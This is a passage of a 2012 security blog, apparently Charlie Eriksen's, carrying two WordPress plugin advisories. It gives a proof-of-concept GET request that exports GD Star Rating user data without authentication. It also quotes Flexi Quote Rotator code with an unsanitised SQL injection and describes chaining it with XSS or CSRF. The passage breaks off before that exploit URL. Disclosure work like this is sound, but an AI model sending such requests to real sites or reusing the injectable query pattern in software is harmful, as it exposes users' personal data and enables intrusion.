class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-i">columns</span><span class="crayon-sy">)</span><span class="crayon-sy">.</span><span class="crayon-s">"\r\n"</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878a6783f056596163-76"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">j_select</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-e">join</span><span class="crayon-sy">(</span><span class="crayon-s">", "</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-i">select</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c9878a6783f056596163-77"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">j_where</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-e">join</span><span class="crayon-sy">(</span><span class="crayon-s">" and "</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-i">where</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878a6783f056596163-78"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">j_tables</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-e">join</span><span class="crayon-sy">(</span><span class="crayon-s">", "</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-i">tables</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c9878a6783f056596163-79"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878a6783f056596163-80"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">return</span><span class="crayon-h"> </span><span class="crayon-e">sprintf</span><span class="crayon-sy">(</span><span class="crayon-s">"select %s from %s where %s order by u.id"</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-i">j_select</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-i">j_tables</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-i">j_where</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c9878a6783f056596163-81"><span class="crayon-sy">}</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0238 seconds] -->
<p>Here we see it takes in the &#8220;de&#8221;, &#8220;us&#8221;, and further get parameters and starts building up a SQL query to return. What we notice is that at no point so far have we seen any validation that the calling user is an admin. Also we notice that it checks the GET parameters &#8220;ip&#8221; and &#8220;ua&#8221;, which are used to toggle whether or not to return the IP and user agent information</p>
<p>Because of the lack of validation of the calling user, we can create an extremely simple request, which will export this data in clear text, including username, email, ip, and user agent.</p><!-- Crayon Syntax Highlighter v2.5.0 -->

		<div id="crayon-53c9878a67851093450614" class="crayon-syntax crayon-theme-twilight crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; float: none; clear: both; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
GET /wordpress/wp-content/plugins/gd-star-rating/export.php?ex=user&amp;de=article&amp;us=nor&amp;ip=on&amp;ua=on HTTP/1.1
Host: 192.168.80.130</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-53c9878a67851093450614-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878a67851093450614-2">2</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-line" id="crayon-53c9878a67851093450614-1"><span class="crayon-i">GET</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-i">wordpress</span><span class="crayon-o">/</span><span class="crayon-i">wp</span><span class="crayon-o">-</span><span class="crayon-i">content</span><span class="crayon-o">/</span><span class="crayon-i">plugins</span><span class="crayon-o">/</span><span class="crayon-i">gd</span><span class="crayon-o">-</span><span class="crayon-i">star</span><span class="crayon-o">-</span><span class="crayon-i">rating</span><span class="crayon-o">/</span><span class="crayon-v">export</span><span class="crayon-sy">.</span><span class="crayon-i">php</span><span class="crayon-sy">?</span><span class="crayon-v">ex</span><span class="crayon-o">=</span><span class="crayon-i">user</span><span class="crayon-o">&amp;</span><span class="crayon-v">de</span><span class="crayon-o">=</span><span class="crayon-i">article</span><span class="crayon-o">&amp;</span><span class="crayon-v">us</span><span class="crayon-o">=</span><span class="crayon-i">nor</span><span class="crayon-o">&amp;</span><span class="crayon-v">ip</span><span class="crayon-o">=</span><span class="crayon-i">on</span><span class="crayon-o">&amp;</span><span class="crayon-v">ua</span><span class="crayon-o">=</span><span class="crayon-e">on </span><span class="crayon-i">HTTP</span><span class="crayon-o">/</span><span class="crayon-cn">1.1</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878a67851093450614-2"><span class="crayon-i">Host</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-cn">192.168.80.130</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0023 seconds] -->
<p></p>
					</div><!-- .entry-content -->
	
	<footer class="entry-meta">
										<span class="cat-links">
				Posted in <a href="http://ceriksen.com/category/advisories/" title="View all posts in Advisories" rel="category tag">Advisories</a>			</span>
			<span class="sep"> / </span>			
						
						<span class="tag-links">
				Tagged <a href="http://ceriksen.com/tag/gd-star-rating/" rel="tag">GD Star Rating</a>, <a href="http://ceriksen.com/tag/wordpress-plugin/" rel="tag">Wordpress plugin</a>			</span>
			<span class="sep"> / </span>
							
				<span class="comments-link"><a href="http://ceriksen.com/2012/07/25/wordpress-gd-star-rating-information-disclosure-vulnerability/#respond" title="Comment on WordPress GD Star Rating information disclosure vulnerability">Leave a comment</a></span>
		<span class="sep"> / </span>
				
					</footer><!-- #entry-meta -->
</article><!-- #post-39 -->

				
					
<article id="post-50" class="post-50 post type-post status-publish format-standard hentry category-advisories tag-flexi-quote-rotator tag-wordpress-plugin">
	<header class="entry-header">
				<div class="entry-meta">
			<a href="http://ceriksen.com/2012/07/25/wordpress-flexi-quote-rotator-plugin-multiple-vulnerabilities/" title="7:59 pm" rel="bookmark" class="entry-date"><time datetime="2012-07-25T19:59:53+00:00" pubdate>July 25, 2012</time></a> by Charlie Eriksen		</div><!-- .entry-meta -->
		<h2 class="entry-title"><a href="http://ceriksen.com/2012/07/25/wordpress-flexi-quote-rotator-plugin-multiple-vulnerabilities/" title="Permalink to WordPress Flexi Quote Rotator plugin multiple vulnerabilities" rel="bookmark">WordPress Flexi Quote Rotator plugin multiple vulnerabilities</a></h2>

				
					</header><!-- .entry-header -->
	

		<div class="entry-content">
				<p><strong>Advisory</strong><br />
<a href="http://secunia.com/advisories/49910/">Secunia Advisory SA 49910</a></p>
<p><strong>Analysis</strong><br />
The admin interface of the Flexi Quote Rotator plugin for WordPress implements a way for editing a quote through the displayManagementPage function in <a href="http://plugins.svn.wordpress.org/flexi-quote-rotator/tags/0.9/classes/quote-rotator-management.class.php">/classes/quote-rotator-management.class.php</a>.</p><!-- Crayon Syntax Highlighter v2.5.0 -->

		<div id="crayon-53c9878a67f6b725857062" class="crayon-syntax crayon-theme-twilight crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; float: none; clear: both; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
function displayManagementPage()
{
	global $wpdb;
	
	echo "\t\t&lt;div class=\"wrap\"&gt;\n";
	if( $_GET['action']=='edit' )
	{
		$sql = "SELECT * FROM `" . $this-&gt;tableName . "` WHERE `id` = " . $_GET['id'];
		$results = $wpdb-&gt;get_results($sql);
		$r = $results[0];
		echo "\\t\\t\\t&lt;h2&gt;Edit Quote&lt;/h2&gt;\\n";
		echo "\\t\\t\\t&lt;form name=\"EditQuotesForm\" method=\"post\" action=\"?page=flexi-quote-rotator.php\"&gt;\\n";
		echo "\\t\\t\\t\\t&lt;p class=\"submit\"&gt;\n";
		echo "\\t\\t\\t\\t\\t&lt;input type=\"submit\" name=\"submit\" value=\"Update Quote &amp;raquo;\" /&gt;\\n";
		echo "\\t\\t\\t\\t&lt;/p&gt;\n";
		echo "\\t\\t\\t\\t&lt;table class=\"editform\" width=\"100%\" cellspacing=\"2\" cellpadding=\"5\"&gt;\\n";
		echo "\\t\\t\\t\\t\\t&lt;tr&gt;\n";
		echo "\\t\\t\\t\\t\\t\\t&lt;th width=\"33%\" scope=\"row\" valign=\"top\"&gt;&lt;label for=\"quote\"&gt;Quote:&lt;/label&gt;&lt;/th&gt;\\n";
		echo "\\t\\t\\t\\t\\t\\t&lt;td width=\"67%\"&gt;&lt;textarea name=\"quote\" style=\"width:350px;height:200px;\"/&gt;".stripslashes($r-&gt;quote)."&lt;/textarea&gt;&lt;/td&gt;\\n";
		echo "\\t\\t\\t\\t\\t&lt;/tr&gt;\\n";
		echo "\\t\\t\\t\\t\\t&lt;tr&gt;\\n";
		echo "\\t\\t\\t\\t\\t\\t&lt;th width=\"33%\" scope=\"row\" valign=\"top\"&gt;&lt;label for=\"author\"&gt;Author:&lt;/label&gt;&lt;/th&gt;\\n";
		echo "\\t\\t\\t\\t\\t\\t&lt;td width=\"67%\"&gt;&lt;input type=\"text\" name=\"author\" style=\"width:350px;\" value=\"".stripslashes($r-&gt;author)."\"/&gt;&lt;/td&gt;\\n";
		echo "\\t\\t\\t\\t\\t&lt;/tr&gt;\\n";
		echo "\\t\\t\\t\\t&lt;/table&gt;\n";
		echo "\\t\\t\\t\\t&lt;input type=\"hidden\" name=\"editQuote\" value=\"1\" /&gt;\\n";
		echo "\\t\\t\\t\\t&lt;input type=\"hidden\" name=\"id\" value=\"".$r-&gt;id."\" /&gt;\\n";
		echo "\\t\\t\\t\\t&lt;p class=\"submit\"&gt;\\n";
		echo "\\t\\t\\t\\t\\t&lt;input type=\"submit\" name=\"submit\" value=\"Update Quote &amp;raquo;\" /&gt;\\n";
		echo "\\t\\t\\t\\t&lt;/p&gt;\\n";
		echo "\\t\\t\\t&lt;/form&gt;\\n";
	}</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-53c9878a67f6b725857062-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878a67f6b725857062-2">2</div><div class="crayon-num" data-line="crayon-53c9878a67f6b725857062-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878a67f6b725857062-4">4</div><div class="crayon-num" data-line="crayon-53c9878a67f6b725857062-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878a67f6b725857062-6">6</div><div class="crayon-num" data-line="crayon-53c9878a67f6b725857062-7">7</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878a67f6b725857062-8">8</div><div class="crayon-num" data-line="crayon-53c9878a67f6b725857062-9">9</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878a67f6b725857062-10">10</div><div class="crayon-num" data-line="crayon-53c9878a67f6b725857062-11">11</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878a67f6b725857062-12">12</div><div class="crayon-num" data-line="crayon-53c9878a67f6b725857062-13">13</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878a67f6b725857062-14">14</div><div class="crayon-num" data-line="crayon-53c9878a67f6b725857062-15">15</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878a67f6b725857062-16">16</div><div class="crayon-num" data-line="crayon-53c9878a67f6b725857062-17">17</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878a67f6b725857062-18">18</div><div class="crayon-num" data-line="crayon-53c9878a67f6b725857062-19">19</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878a67f6b725857062-20">20</div><div class="crayon-num" data-line="crayon-53c9878a67f6b725857062-21">21</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878a67f6b725857062-22">22</div><div class="crayon-num" data-line="crayon-53c9878a67f6b725857062-23">23</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878a67f6b725857062-24">24</div><div class="crayon-num" data-line="crayon-53c9878a67f6b725857062-25">25</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878a67f6b725857062-26">26</div><div class="crayon-num" data-line="crayon-53c9878a67f6b725857062-27">27</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878a67f6b725857062-28">28</div><div class="crayon-num" data-line="crayon-53c9878a67f6b725857062-29">29</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878a67f6b725857062-30">30</div><div class="crayon-num" data-line="crayon-53c9878a67f6b725857062-31">31</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878a67f6b725857062-32">32</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-line" id="crayon-53c9878a67f6b725857062-1"><span class="crayon-t">function</span><span class="crayon-h"> </span><span class="crayon-e">displayManagementPage</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878a67f6b725857062-2"><span class="crayon-sy">{</span></div><div class="crayon-line" id="crayon-53c9878a67f6b725857062-3"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-m">global</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-i">wpdb</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878a67f6b725857062-4"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span></div><div class="crayon-line" id="crayon-53c9878a67f6b725857062-5"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-i">echo</span><span class="crayon-h"> </span><span class="crayon-s">"\t\t&lt;div class=\"wrap\"&gt;\n"</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878a67f6b725857062-6"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">if</span><span class="crayon-sy">(</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">_GET</span><span class="crayon-sy">[</span><span class="crayon-s">'action'</span><span class="crayon-sy">]</span><span class="crayon-o">==</span><span class="crayon-s">'edit'</span><span class="crayon-h"> </span><span class="crayon-sy">)</span></div><div class="crayon-line" id="crayon-53c9878a67f6b725857062-7"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">{</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878a67f6b725857062-8"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">sql</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">"SELECT * FROM `"</span><span class="crayon-h"> </span><span class="crayon-sy">.</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-r">this</span><span class="crayon-o">-&gt;</span><span class="crayon-v">tableName</span><span class="crayon-h"> </span><span class="crayon-sy">.</span><span class="crayon-h"> </span><span class="crayon-s">"` WHERE `id` = "</span><span class="crayon-h"> </span><span class="crayon-sy">.</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">_GET</span><span class="crayon-sy">[</span><span class="crayon-s">'id'</span><span class="crayon-sy">]</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c9878a67f6b725857062-9"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">results</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-i">wpdb</span><span class="crayon-o">-&gt;</span><span class="crayon-e">get_results</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-i">sql</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878a67f6b725857062-10"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">r</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">results</span><span class="crayon-sy">[</span><span class="crayon-cn">0</span><span class="crayon-sy">]</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c9878a67f6b725857062-11"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-i">echo</span><span class="crayon-h"> </span><span class="crayon-s">"\\t\\t\\t&lt;h2&gt;Edit Quote&lt;/h2&gt;\\n"</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878a67f6b725857062-12"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-i">echo</span><span class="crayon-h"> </span><span class="crayon-s">"\\t\\t\\t&lt;form name=\"EditQuotesForm\" method=\"post\" action=\"?page=flexi-quote-rotator.php\"&gt;\\n"</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c9878a67f6b725857062-13"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-i">echo</span><span class="crayon-h"> </span><span class="crayon-s">"\\t\\t\\t\\t&lt;p class=\"submit\"&gt;\n"</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878a67f6b725857062-14"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-i">echo</span><span class="crayon-h"> </span><span class="crayon-s">"\\t\\t\\t\\t\\t&lt;input type=\"submit\" name=\"submit\" value=\"Update Quote &amp;raquo;\" /&gt;\\n"</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c9878a67f6b725857062-15"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-i">echo</span><span class="crayon-h"> </span><span class="crayon-s">"\\t\\t\\t\\t&lt;/p&gt;\n"</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878a67f6b725857062-16"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-i">echo</span><span class="crayon-h"> </span><span class="crayon-s">"\\t\\t\\t\\t&lt;table class=\"editform\" width=\"100%\" cellspacing=\"2\" cellpadding=\"5\"&gt;\\n"</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c9878a67f6b725857062-17"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-i">echo</span><span class="crayon-h"> </span><span class="crayon-s">"\\t\\t\\t\\t\\t&lt;tr&gt;\n"</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878a67f6b725857062-18"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-i">echo</span><span class="crayon-h"> </span><span class="crayon-s">"\\t\\t\\t\\t\\t\\t&lt;th width=\"33%\" scope=\"row\" valign=\"top\"&gt;&lt;label for=\"quote\"&gt;Quote:&lt;/label&gt;&lt;/th&gt;\\n"</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c9878a67f6b725857062-19"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-i">echo</span><span class="crayon-h"> </span><span class="crayon-s">"\\t\\t\\t\\t\\t\\t&lt;td width=\"67%\"&gt;&lt;textarea name=\"quote\" style=\"width:350px;height:200px;\"/&gt;"</span><span class="crayon-sy">.</span><span class="crayon-e">stripslashes</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-i">r</span><span class="crayon-o">-&gt;</span><span class="crayon-i">quote</span><span class="crayon-sy">)</span><span class="crayon-sy">.</span><span class="crayon-s">"&lt;/textarea&gt;&lt;/td&gt;\\n"</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878a67f6b725857062-20"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-i">echo</span><span class="crayon-h"> </span><span class="crayon-s">"\\t\\t\\t\\t\\t&lt;/tr&gt;\\n"</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c9878a67f6b725857062-21"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-i">echo</span><span class="crayon-h"> </span><span class="crayon-s">"\\t\\t\\t\\t\\t&lt;tr&gt;\\n"</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878a67f6b725857062-22"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-i">echo</span><span class="crayon-h"> </span><span class="crayon-s">"\\t\\t\\t\\t\\t\\t&lt;th width=\"33%\" scope=\"row\" valign=\"top\"&gt;&lt;label for=\"author\"&gt;Author:&lt;/label&gt;&lt;/th&gt;\\n"</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c9878a67f6b725857062-23"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-i">echo</span><span class="crayon-h"> </span><span class="crayon-s">"\\t\\t\\t\\t\\t\\t&lt;td width=\"67%\"&gt;&lt;input type=\"text\" name=\"author\" style=\"width:350px;\" value=\""</span><span class="crayon-sy">.</span><span class="crayon-e">stripslashes</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-i">r</span><span class="crayon-o">-&gt;</span><span class="crayon-i">author</span><span class="crayon-sy">)</span><span class="crayon-sy">.</span><span class="crayon-s">"\"/&gt;&lt;/td&gt;\\n"</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878a67f6b725857062-24"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-i">echo</span><span class="crayon-h"> </span><span class="crayon-s">"\\t\\t\\t\\t\\t&lt;/tr&gt;\\n"</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c9878a67f6b725857062-25"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-i">echo</span><span class="crayon-h"> </span><span class="crayon-s">"\\t\\t\\t\\t&lt;/table&gt;\n"</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878a67f6b725857062-26"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-i">echo</span><span class="crayon-h"> </span><span class="crayon-s">"\\t\\t\\t\\t&lt;input type=\"hidden\" name=\"editQuote\" value=\"1\" /&gt;\\n"</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c9878a67f6b725857062-27"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-i">echo</span><span class="crayon-h"> </span><span class="crayon-s">"\\t\\t\\t\\t&lt;input type=\"hidden\" name=\"id\" value=\""</span><span class="crayon-sy">.</span><span class="crayon-sy">$</span><span class="crayon-i">r</span><span class="crayon-o">-&gt;</span><span class="crayon-v">id</span><span class="crayon-sy">.</span><span class="crayon-s">"\" /&gt;\\n"</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878a67f6b725857062-28"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-i">echo</span><span class="crayon-h"> </span><span class="crayon-s">"\\t\\t\\t\\t&lt;p class=\"submit\"&gt;\\n"</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c9878a67f6b725857062-29"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-i">echo</span><span class="crayon-h"> </span><span class="crayon-s">"\\t\\t\\t\\t\\t&lt;input type=\"submit\" name=\"submit\" value=\"Update Quote &amp;raquo;\" /&gt;\\n"</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878a67f6b725857062-30"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-i">echo</span><span class="crayon-h"> </span><span class="crayon-s">"\\t\\t\\t\\t&lt;/p&gt;\\n"</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c9878a67f6b725857062-31"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-i">echo</span><span class="crayon-h"> </span><span class="crayon-s">"\\t\\t\\t&lt;/form&gt;\\n"</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878a67f6b725857062-32"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">}</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0083 seconds] -->
<p>It does so by checking the action GET parameter first. If it is &#8220;edit&#8221;, it will then concatenate the &#8220;id&#8221; GET parameter into a SQL query, and write the result out to the page. But because it does not correctly sanitize the &#8220;id&#8221; GET parameter, which causes a SQL injection. Also, this piece of code can be invoked without a nonce, which causes a CSRF vulnerability. Additionally, while it output-encodes the author and quote column, it does not encode the ID. This means we have two options for exploiting these 3 vulnerabilities:</p>
<ul>
<li>Chaining the SQL Injection and the XSS in order to execute javascript in the admins browser</li>
<li>Chaining the SQL Injection and the CSRF in order to execute arbitrary SQL blindly</li>
</ul>
<p>Here is an example of the former, where we trick the admin user into clicking on our specially crafted URL:</p><!-- Crayon Syntax Highlighter v2.5.0 -->

